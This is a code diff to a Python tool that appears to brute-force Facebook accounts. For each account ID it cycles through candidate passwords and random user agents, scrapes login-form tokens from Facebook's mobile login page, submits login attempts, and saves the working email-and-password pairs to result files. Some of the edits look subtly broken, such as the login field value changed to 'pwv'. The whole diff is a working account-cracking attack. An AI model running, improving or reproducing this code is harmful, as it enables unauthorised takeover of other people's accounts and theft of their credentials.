@@ -1098,7 +1098,7 @@ def validate(idf, pwv,awal):
     prog.update(des,description=f"{SE}{idf} VALIDATE [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
     ua = random.choice(free)
-    ses = requests.Session()
+    r = requests.Session()
     try:
         for pw in pwv:
             pw = pw.lower()
@@ -1118,13 +1118,13 @@ def validate(idf, pwv,awal):
                     })
                 response = r.get('https://m.alpha.facebook.com/login.php?').text
                 try:
-                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
+                    jazoest = re.search('name="jazoest" value="(.*?)"', str(response)).group(1)
                     m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                     li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                     fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                     lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                     __a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
-                    __spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
+                    __spin_t = re.search('"__spin_t":(.*?),', str(response)).group(1)
                 except (AttributeError) as e:
                     Console().print("[bold hot_pink2]   ╰─>[bold red] Failed Scraping...                    ", end='\r');time.sleep(2.0);continue
                 data = {
@@ -1135,7 +1135,7 @@ def validate(idf, pwv,awal):
                         'email': idf,
                         'prefill_contact_point': idf,
                         'prefill_source': 'browser_dropdown',
-                        'prefill_type': 'password',
+                        'prefill_type': 'pwv',
                         'first_prefill_source': 'browser_dropdown',
                         'first_prefill_type': 'contact_point',
                         'had_cp_prefilled': True,
@@ -1179,7 +1179,7 @@ def validate(idf, pwv,awal):
                     tree.add(f"[bold red]Email : {idf}").add(f"[bold red]Password : {pw}", style = "bold white")
                     tree.add(f"[bold red]Useragent : {ua}", style = "bold white")
                     print(tree)
-                    akun.append(f'{idf}|{pw}|{ua}')
+                    akun.append(idf+'|'+pw)
                     open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                     break
                 else:
